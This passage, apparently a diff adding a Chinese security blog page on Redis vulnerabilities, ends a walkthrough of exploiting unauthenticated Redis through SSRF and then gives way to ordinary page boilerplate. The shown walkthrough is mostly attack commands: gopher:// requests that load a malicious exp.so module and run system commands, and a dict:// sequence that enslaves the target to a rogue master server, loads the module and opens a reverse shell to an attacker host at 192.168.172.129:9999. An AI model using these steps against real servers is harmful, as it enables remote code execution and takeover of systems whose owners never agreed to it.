class="hljs-comment">#查看环境变量</span><br>gopher:<span class="hljs-regexp">//</span><span class="hljs-number">0.0</span>.<span class="hljs-number">0.0</span>:<span class="hljs-number">6379</span>/_auth root<br>module load <span class="hljs-regexp">/tmp/</span>exp.so<br>system.exec env<br>quit<br><br>用赛博厨子对上面指令进行url编码<br></code></pre></td></tr></table></figure>
+<p>dict协议反弹shell</p>
+<figure class="highlight awk"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><code class="hljs awk"><span class="hljs-comment">#查看当前redis的相关配置</span><br>ssrf.php?url=dict:<span class="hljs-regexp">//</span><span class="hljs-number">192.168</span>.<span class="hljs-number">172.131</span>:<span class="hljs-number">6379</span>/info<br><br><span class="hljs-comment">#设置备份文件名</span><br>ssrf.php?url=dict:<span class="hljs-regexp">//</span><span class="hljs-number">192.168</span>.<span class="hljs-number">172.131</span>:<span class="hljs-number">6379</span>/config:set:dbfilename:exp.so<br><br><span class="hljs-comment">#连接恶意Redis服务器</span><br>ssrf.php?url=dict:<span class="hljs-regexp">//</span><span class="hljs-number">192.168</span>.<span class="hljs-number">172.131</span>:<span class="hljs-number">6379</span>/slaveof:<span class="hljs-number">192.168</span>.<span class="hljs-number">172.129</span>:<span class="hljs-number">1234</span><br><br><span class="hljs-comment">#加载恶意模块</span><br>ssrf.php?url=dict:<span class="hljs-regexp">//</span><span class="hljs-number">192.168</span>.<span class="hljs-number">172.131</span>:<span class="hljs-number">6379</span><span class="hljs-regexp">/module:load:./</span>exp.so<br><br><span class="hljs-comment">#切断主从复制</span><br>ssrf.php?url=dict:<span class="hljs-regexp">//</span><span class="hljs-number">192.168</span>.<span class="hljs-number">172.131</span>:<span class="hljs-number">6379</span>/slaveof:no:one<br><br><span class="hljs-comment">#执行系统命令</span><br> ssrf.php?url=dict:<span class="hljs-regexp">//</span><span class="hljs-number">192.168</span>.<span class="hljs-number">172.131</span>:<span class="hljs-number">6379</span>/system.rev:<span class="hljs-number">192.168</span>.<span class="hljs-number">172.129</span>:<span class="hljs-number">9999</span><br></code></pre></td></tr></table></figure>
+<p><a target="_blank" rel="noopener" href="https://github.com/izj007/wechat/blob/main/articles/%5Bsnowming%5D-2021-8-15-Redis%20%E6%9C%AA%E6%8E%88%E6%9D%83%E6%8B%BF%20shell%20%E5%88%A9%E7%94%A8%E6%96%B9%E5%BC%8F%E5%88%86%E6%9E%90%E3%80%90%E4%B8%8A%E7%AF%87%E3%80%91.md">比较yyds的参考文章1</a></p>
+<p><a target="_blank" rel="noopener" href="https://github.com/izj007/wechat/blob/main/articles/%5B%E8%8A%B1%E6%8C%87%E4%BB%A4%E5%AE%89%E5%85%A8%E5%AE%9E%E9%AA%8C%E5%AE%A4%5D-2021-8-7-Redis%20%E6%94%BB%E5%87%BB%E6%96%B9%E6%B3%95%E6%80%BB%E7%BB%93.md">比较yyds的参考文章2</a></p>
+
+                
+              </div>
+            
+            <hr/>
+            <div>
+              <p class="note note-warning">
+                <strong>本文作者: </strong><a href="/">fru1ts</a> <br>
+                <strong>本文链接: </strong><a href="https://fru1ts.github.io/2023/08/04/Redis%E6%BC%8F%E6%B4%9E/">https://fru1ts.github.io/2023/08/04/Redis%E6%BC%8F%E6%B4%9E/</a> <br>
+                <strong>版权声明: </strong>本站均采用BY-SA协议，除特别声明外，转载请注明出处!
+                   </p>
+                   
+
+              
+                <div class="post-prevnext my-3">
+                  <article class="post-prev col-6">
+                    
+                    
+                      <a href="/2023/08/28/python%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/" title="python反序列化">
+                        <i class="iconfont icon-arrowleft"></i>
+                        <span class="hidden-mobile">python反序列化</span>
+                        <span class="visible-mobile">Previous</span>
+                      </a>
+                    
+                  </article>
+                  <article class="post-next col-6">
+                    
+                    
+                      <a href="/2023/07/24/flask%E8%AE%A1%E7%AE%97PIN%E7%A0%81/" title="flask计算PIN码">
+                        <span class="hidden-mobile">flask计算PIN码</span>
+                        <span class="visible-mobile">Next</span>
+                        <i class="iconfont icon-arrowright"></i>
+                      </a>
+                    
+                  </article>
+                </div>
+              
+            </div>
+
+            
+  
+  
+    <article id="comments" lazyload>
+      
+  <div id="valine"></div>
+  <script type="text/javascript">
+    Fluid.utils.loadComments('#valine', function() {
+      Fluid.utils.createScript('https://lib.baomitu.com/valine/1.5.1/Valine.min.js', function() {
+        var options = Object.assign(
+          {"appId":"WEdmoCOkNdSUMsONpu72ngCo-gzGzoHsz","appKey":"PSBkctB8cKrR97yZLNXnJ0nj","path":"window.location.pathname","placeholder":null,"avatar":"retro","meta":["nick","mail","link"],"requiredFields":[],"pageSize":10,"lang":"zh-CN","highlight":false,"recordIP":false,"serverURLs":"","emojiCDN":null,"emojiMaps":null,"enableQQ":false},
+          {
+            el: "#valine",
+            path: window.location.pathname
+          }
+        )
+        new Valine(options);
+        Fluid.utils.waitElementVisible('#valine .vcontent', () => {
+          var imgSelector = '#valine .vcontent img:not(.vemoji)';
+          Fluid.plugins.imageCaption(imgSelector);
+          Fluid.plugins.fancyBox(imgSelector);
+        })
+      });
+    });
+  </script>
+  <noscript>Please enable JavaScript to view the comments</noscript>
+
+
+    </article>
+  
+
+
+          </article>
+        </div>
+      </div>
+    </div>
+
+    <div class="side-col d-none d-lg-block col-lg-2">
+      
+  <aside class="sidebar" style="margin-left: -1rem">
+    <div id="toc">
+  <p class="toc-header">
+    <i class="iconfont icon-list"></i>
+    <span>Table of Contents</span>
+  </p>
+  <div class="toc-body" id="toc-body"></div>
+</div>
+
+
+
+  </aside>
+
+
+    </div>
+  </div>
+</div>
+
+
+
+
+
+  
+
+
+
+  
+
+
+
+  
+
+
+
+  
+
+
+
+  
+
+
+  
+  
+
+
+
+
+
+
+
+
+    
+
+    
+      <a id="scroll-top-button" aria-label="TOP" href="#" role="button">
+        <i class="iconfont icon-arrowup" aria-hidden="true"></i>
+      </a>
+    
+
+    
+      <div class="modal fade" id="modalSearch" tabindex="-1" role="dialog" aria-labelledby="ModalLabel"
+     aria-hidden="true">
+  <div class="modal-dialog modal-dialog-scrollable modal-lg" role="document">
+    <div class="modal-content">
+      <div class="modal-header text-center">
+        <h4 class="modal-title w-100 font-weight-bold">Search</h4>
+        <button type="button" id="local-search-close" class="close" data-dismiss="modal" aria-label="Close">
+          <span aria-hidden="true">&times;</span>
+        </button>
+      </div>
+      <div class="modal-body mx-3">
+        <div class="md-form mb-5">
+          <input type="text" id="local-search-input" class="form-control validate">
+          <label data-error="x" data-success="v" for="local-search-input">Keyword</label>
+        </div>
+        <div class="list-group" id="local-search-result"></div>
+      </div>
+    </div>
+  </div>
+</div>
+
+    
+
+    
+  </main>
+
+  <footer>
+    <div class="footer-inner">
+  
+    <div class="footer-content">
+       <div> <span id="timeDate">载入天数...</span> <span id="times">载入时分秒...</span> </div> 
+    </div>
+  
+  
+    <div class="statistics">
+  
+  
+
+  
+    
+      <span id="leancloud-site-pv-container" style="display: none">
+        Total number of visits 
+        <span id="leancloud-site-pv"></span>
+         
+      </span>
+    
+    
+      <span id="leancloud-site-uv-container" style="display: none">
+        Total number of visitors 
+        <span id="leancloud-site-uv"></span>
+         
+      </span>
+    
+    
+
+  
+</div>
+
+  
+  
+  
+</div>
+
+  </footer>
+
+  <!-- Scripts -->
+  
+  <script  src="https://lib.baomitu.com/nprogress/0.2.0/nprogress.min.js" ></script>
+  <link  rel="stylesheet" href="https://lib.baomitu.com/nprogress/0.2.0/nprogress.min.css" />
+
+  <script>
+    NProgress.configure({"showSpinner":false,"trickleSpeed":100})
+    NProgress.start()
+    window.addEventListener('load', function() {
+      NProgress.done();
+    })
+  </script>
+
+
+<script  src="https://lib.baomitu.com/jquery/3.6.0/jquery.min.js" ></script>
+<script  src="https://lib.baomitu.com/twitter-bootstrap/4.6.1/js/bootstrap.min.js" ></script>
+<script  src="/js/events.js" ></script>
+<script  src="/js/plugins.js" ></script>
+
+
+  <script  src="https://lib.baomitu.com/typed.js/2.0.12/typed.min.js" ></script>
+  <script>
+    (function (window, document) {
+      var typing = Fluid.plugins.typing;
+      var subtitle = document.getElementById('subtitle');
+      if (!subtitle || !typing) {
+        return;
+      }
+      var text = subtitle.getAttribute('data-typed-text');
+      
+        typing(text);
+      
+    })(window, document);
+  </script>
+
+
+
+
+  
+    <script  src="/js/img-lazyload.js" ></script>
+  
+
+
+
+
+  
+<script>
+  Fluid.utils.createScript('https://lib.baomitu.com/tocbot/4.18.2/tocbot.min.js', function() {
+    var toc = jQuery('#toc');
+    if (toc.length === 0 || !window.tocbot) { return; }
+    var boardCtn = jQuery('#board-ctn');
+    var boardTop = boardCtn.offset().top;
+
+    window.tocbot.init(Object.assign({
+      tocSelector     : '#toc-body',
+      contentSelector : '.markdown-body',
+      linkClass       : 'tocbot-link',
+      activeLinkClass : 'tocbot-active-link',
+      listClass       : 'tocbot-list',
+      isCollapsedClass: 'tocbot-is-collapsed',
+      collapsibleClass: 'tocbot-is-collapsible',
+      scrollSmooth    : true,
+      includeTitleTags: true,
+      headingsOffset  : -boardTop,
+    }, CONFIG.toc));
+    if (toc.find('.toc-list-item').length > 0) {
+      toc.css('visibility', 'visible');
+    }
+
+    Fluid.events.registerRefreshCallback(function() {
+      if ('tocbot' in window) {
+        tocbot.refresh();
+        var toc = jQuery('#toc');
+        if (toc.length === 0 || !tocbot) {
+          return;
+        }
+        if (toc.find('.toc-list-item').length > 0) {
+          toc.css('visibility', 'visible');
+        }
+      }
+    });
+  });
+</script>
+
+
+  <script src=https://lib.baomitu.com/clipboard.js/2.0.11/clipboard.min.js></script>
+
+  <script>Fluid.plugins.codeWidget();</script>
+
+
+  
+<script>
+  Fluid.utils.createScript('https://lib.baomitu.com/anchor-js/4.3.1/anchor.min.js', function() {
+    window.anchors.options = {
+      placement: CONFIG.anchorjs.placement,
+      visible  : CONFIG.anchorjs.visible
+    };
+    if (CONFIG.anchorjs.icon) {
+      window.anchors.options.icon = CONFIG.anchorjs.icon;
+    }
+    var el = (CONFIG.anchorjs.element || 'h1,h2,h3,h4,h5,h6').split(',');
+    var res = [];
+    for (var item of el) {
+      res.push('.markdown-body > ' + item.trim());
+    }
+    if (CONFIG.anchorjs.placement === 'left') {
+      window.anchors.options.class = 'anchorjs-link-left';
+    }
+    window.anchors.add(res.join(', '));
+
+    Fluid.events.registerRefreshCallback(function() {
+      if ('anchors' in window) {
+        anchors.removeAll();
+        var el = (CONFIG.anchorjs.element || 'h1,h2,h3,h4,h5,h6').split(',');
+        var res = [];
+        for (var item of el) {
+          res.push('.markdown-body > ' + item.trim());
+        }
+        if (CONFIG.anchorjs.placement === 'left') {
+          anchors.options.class = 'anchorjs-link-left';
+        }
+        anchors.add(res.join(', '));
+      }
+    });
+  });
+</script>
+
+
+  
+<script>
+  Fluid.utils.createScript('https://lib.baomitu.com/fancybox/3.5.7/jquery.fancybox.min.js', function() {
+    Fluid.plugins.fancyBox();
+  });
+</script>
+
+
+  <script>Fluid.plugins.imageCaption();</script>
+
+  <script defer src="/js/leancloud.js" ></script>
+
+  <script  src="/js/local-search.js" ></script>
+
+
+
+
+  
+<script src="/js/DynamicLine.js"></script>
+<script src="/js/star.js"></script>
+<script src="/js/love.js"></script>
+<script src="/js/duration.js"></script>
+
+
+
+<!-- 主题的启动项，将它保持在最底部 -->
+<!-- the boot of the theme, keep it at the bottom -->
+<script  src="/js/boot.js" ></script>
+
+
+  
+
+  <noscript>
+    <div class="noscript-warning">Blog works best with JavaScript enabled</div>
+  </noscript>
+<script src="/live2dw/lib/L2Dwidget.min.js?094cbace49a39548bed64abff5988b05"></script><script>L2Dwidget.init({"pluginRootPath":"live2dw/","pluginJsPath":"lib/","pluginModelPath":"assets/","tagMode":false,"debug":false,"model":{"jsonPath":"/live2dw/assets/assets/wanko.model.json"},"display":{"position":"left","width":150,"height":300},"mobile":{"show":true},"react":{"opacity":0.7},"log":false});</script></body>
+</html>
